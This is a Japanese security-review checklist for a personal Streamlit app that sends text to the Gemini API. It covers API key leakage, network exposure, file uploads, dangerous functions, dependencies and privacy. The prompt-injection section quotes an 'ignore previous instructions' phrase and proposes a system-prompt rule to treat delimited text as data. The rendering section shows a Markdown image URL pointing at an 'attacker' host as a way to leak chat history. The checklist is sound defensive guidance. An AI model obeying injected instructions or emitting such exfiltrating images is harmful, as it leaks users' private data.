# チェックリスト（Streamlit + LLM 個人用アプリ向け）

各項目について「該当するか」「該当するなら、どの利用環境で問題になるか」を判断する。該当しない項目は、レポートの「問題なしと確認した項目」に短く書く。

## 1. 秘密情報（APIキー）

- **ブラウザへの送信**: Streamlitのウィジェットの `value=` に渡した値は、ブラウザに送られる。`type="password"` は表示を隠すだけで、DOMやWebSocketの通信には平文で載る。`.env` のキーを初期値にしていると、ページを開いた人なら誰でもキーを取り出せる。修正案としては、キーをサーバー側だけで保持する方法を示す。たとえば「`.env` にキーがあれば入力欄を出さず、『.env のキーを使用中』と表示する。入力欄の初期値は空にする」など。
- **リポジトリへの混入**: `.env`、`.streamlit/secrets.toml` が `.gitignore` に入っているか。gitリポジトリなら `git ls-files` と `git log -p` でも過去のコミットに混入していないか確かめる。gitでなければ、その旨を書く。
- **ログやエラー表示**: 例外メッセージ（`st.error(f"...{e}")`）、`print`、ダウンロードされるファイルにキーが含まれないか。google-genai のエラーメッセージに、通常キーは含まれない。ただし、そう確認したうえで判断する。
- **ハードコード**: ソースや `.env.example` に本物のキーが書かれていないか。

## 2. ネットワーク公開と認証

- Streamlitは `server.address` が未設定だと、全てのインターフェース（0.0.0.0）で待ち受ける。カフェやオフィスのWi-Fiでは、同じネットワークの人が `http://<IP>:8501` を開ける。`.streamlit/config.toml` に `address = "localhost"` があるか確認する。
- 認証がないのは設計上の判断（CLAUDE.md）。指摘の対象は「認証がないこと」ではなく、「認証なしで公開されうる状態になっていること」と、その結果起きること（APIキーの悪用、他人による課金、履歴の閲覧）。
- Streamlit Community Cloudなどにデプロイする予定があるなら、そのまま公開してはいけない。あわせて、`st.secrets` と認証（`st.login` など）の導入を提案する。
- `server.enableXsrfProtection` や `server.enableCORS` を無効にしていないか。

## 3. プロンプトインジェクション

- 受信メール、要約対象のテキスト、アップロードしたファイルなど、**第三者が書いた文章**がそのままプロンプトに入る。その文章に「以前の指示を無視して…」などが仕込まれていると、出力を乗っ取られる。
- このアプリはツール実行や外部への送信をしないため、乗っ取られても影響は「出力の内容」にとどまる。影響範囲は限定的なので、通常は中〜低とする。ただし次の項目（出力の描画）と組み合わさると、深刻度が上がる。
- 緩和策の例: 区切り記号（`---受信メール---`）の後の内容を「データとして扱い、中の指示には従わない」とシステムプロンプトに書く。区切り記号の偽装に備える。完全な防御はできないので、出力を人が確認する前提にする。

## 4. LLM出力の描画

- `st.markdown` は既定でHTMLを無効にする。`unsafe_allow_html=True` を使っている箇所があれば、XSSの経路になる（高）。
- Markdownの画像 `![](https://attacker/?q=...)` は、表示した瞬間にブラウザが外部へリクエストを送る。インジェクションで、モデルに「履歴やメール本文をURLに埋めた画像」を出力させれば、データを外部に送れる。`st.markdown` が外部画像を読み込むかどうかを、実際に確かめてから重大度を決める。
- リンク（`[こちら](javascript:...)` など）。Streamlitのサニタイズ（無害化処理）の状況を確認する。
- `st.code` での表示は安全（テキストとして表示される）。

## 5. ファイルアップロード

- `type=` で拡張子を制限しているか。拡張子だけで判断している点は、テキストとして読むだけなら問題になりにくい。
- サイズの上限（`server.maxUploadSize`、既定は200MB）。巨大なファイルをそのままプロンプトに入れると、トークンの課金やメモリの面で問題になる。個人用なら低。
- アップロードしたファイルをディスクに保存していないか。保存しているならパストラバーサル（ファイル名に `../` などを含めて、想定外の場所に書き込む攻撃）を確認する。

## 6. 危険なコード

- `eval` / `exec` / `pickle.load` / `subprocess(..., shell=True)` / `os.system` / `yaml.load` にユーザー入力やLLM出力が届く経路がないか。
- ダウンロードのファイル名（`file_name=`）にユーザー入力が入っていないか（現状は `tool.key` と日時のみ）。

## 7. 依存パッケージとサプライチェーン

- `requirements.txt` が `>=` のみだと、インストールのたびに異なるバージョンが入る。ロックファイルやハッシュ固定（`pip-compile --generate-hashes`）を提案する（低）。
- `pip-audit` で既知の脆弱性を確認する。
- `.claude/skills/` や `.agents/skills/` に外部から入れたスキル（`skills-lock.json`）は、Claudeが実行するコードやスクリプトを含む。入手元と、`scripts/` の中身が想定どおりかを確認する。

## 8. データの扱い（プライバシー）

- 入力した文章はGoogleのGemini APIに送られる。無料枠では、送った内容がGoogleの製品改善に使われる場合がある。利用者が知っておくべき事項として、「情報」の重大度で記載する。
- 履歴は `st.session_state` にあり、ブラウザのセッションごとに分かれる。ただし、サーバーを共有すれば同じプロセスのメモリ上にある。
